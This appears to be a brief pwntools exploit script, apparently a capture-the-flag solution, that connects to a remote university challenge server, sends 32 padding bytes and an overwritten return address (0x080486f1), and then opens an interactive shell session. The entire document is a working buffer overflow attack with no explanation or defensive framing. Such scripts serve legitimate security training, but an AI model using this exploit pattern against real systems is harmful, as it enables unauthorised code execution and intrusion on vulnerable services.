from pwn import *

s =  remote('mustard.stt.rnl.tecnico.ulisboa.pt', 23153)

print(s.recvline())

s.send("x"*0x20)
s.sendline(b'\xf1\x86\x04\x08')

s.interactive()
